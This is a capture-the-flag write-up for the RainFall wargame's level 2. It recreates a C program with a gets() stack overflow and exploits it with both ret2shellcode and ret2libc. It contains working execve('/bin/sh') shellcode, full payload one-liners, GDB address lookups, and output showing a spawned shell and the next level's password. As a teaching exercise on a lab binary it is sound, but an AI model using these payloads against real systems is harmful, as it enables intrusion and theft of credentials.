# Level 2

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void p(void)
{
    fflush(stdout);

    int buffer[16];
    gets(buffer);

    int tmp = buffer[20];
    if ((tmp & 0xb0000000) == 0xb0000000)
    {
        printf("(%p)\n", tmp);
        exit(1);
    }
    puts(buffer);
    strdup(buffer);
}

int main(void)
{
    p();
}
```

Let's focus on the `p` function. It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read.

In this case, the program's stack is allocated 104 bytes:
```
# Allocating 104 bytes on the stack
0x080484d7 <+3>:     sub    $0x68,%esp

# Calculate the address of ebp - 76, since we allocated 104 bytes for the stack and since our next variable start at ebp - 12, our buffer will therefore be 64 bytes (here buf is an int array, so 64 bytes = 16 * 4 bytes)
0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax

# Move 4 bytes above ebp aka the return address into eax
0x080484f2 <+30>:    mov    0x4(%ebp),%eax

# Moving the return address into ebp - 12 which is our next variable
0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
```

Although we allocated 104 bytes on the stack, our buffer only starts at ebp - 76, which means that we only have to write 76 bytes before overflowing the stack. Furthermore, we need to write 4 bytes to reach the return address so 80 bytes in total (as shown in the assembly code above). Anything written beyond those 80 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `p` function.

There's different ways to solve this challenge, we'll see two of them. First the intended way (I assume) with a ret2shellcode and then the ret2libc way.

### Ret2Shellcode
We opt for a shellcode designed to spawn a shell. This shellcode, taken from the [Exploit Database](https://www.exploit-db.com/exploits/41757), is compact and effective for our purpose:

`\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`

To redirect the execution, after the buffer overflow, we need an address. We use `ltrace` to find that `strdup` returns to `0x0804a008`.

```bash
$ ltrace ./level2
[...]
strdup("") = 0x0804a008
```

Since `strdup` allocates the buffer that was read by `gets`, the address of the shellcode will be stored at `0x0804a008` (The address that was returned by strdup).

So our payload will be:
```
shellcode + padding + address of shellcode
Alternatively, you could place the padding before the shellcode, using NOPs.

"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\xa0\x04\x08"

The padding is 80 - 21 because the shellcode is 21 bytes long.
```

Alright let's try it:
```bash
level2@RainFall:~$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*(80-21) + "\x08\xa0\x04\x08")' && cat) | ./level2
j
 X�Rh//shh/bin��1�̀������������������������������������������������������
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Perfect, let's move to the other solution.

### Ret2Libc
Ret2Libc (Return-to-Libc) is an exploit technique that doesn't require injecting shellcode but instead redirects the program flow to execute existing library functions.

A typical Ret2Libc exploit is constructed as follows:
```
padding + address of system + address of exit + address of "/bin/sh"

The address of exit is actually optional, but not providing it will cause the program to crash after executing the system function.
```

We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:

```bash
# System
(gdb) info function system
0xb7e6b060  __libc_system
0xb7e6b060  system

# Exit
(gdb) info functions exit
0x080483d0  _exit
0x080483d0  _exit@plt

# /bin/sh
(gdb) info proc mappings
[...]
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
[...]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

However we'll need to include an extra step because of the following lines:
```c
if ((tmp & 0xb0000000) == 0xb0000000)
{
    printf("(%p)\n", tmp);
    exit(1);
}
```

Ealier, I mentionned that the return address was put into our next variable, which is `tmp`. So the `&` operator, along with the `0xb0000000` mask is used to check if our return address most significant byte is equal to `0xb`. If it is, the program will exit. So we need to find an address that doesn't start with `0xb`. 

Given that the address of the `system` function begins with `0xb`, it cannot be directly used. So we'll have to include the address of a `ret` instruction in our payload. When the program attempts to return to this address, the `ret` instruction pops the address of `system` into the EIP register, causing the program to jump to `system`.


Alright, let's craft our payload:
```
reminder: padding + address of system + address of exit + address of "/bin/sh"

"\x90"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xd0\x83\x04\x08" + "\x58\xcc\xf8\xb7"
```

Let's run it:
```bash
level2@RainFall:~$ (python -c 'print("\x90"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xd0\x83\x04\x08" + "\x58\xcc\xf8\xb7")' && cat) | ./level2
����������������������������������������������������������������>������������>`��X���
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

We are now level3! Let's move on to the next level.
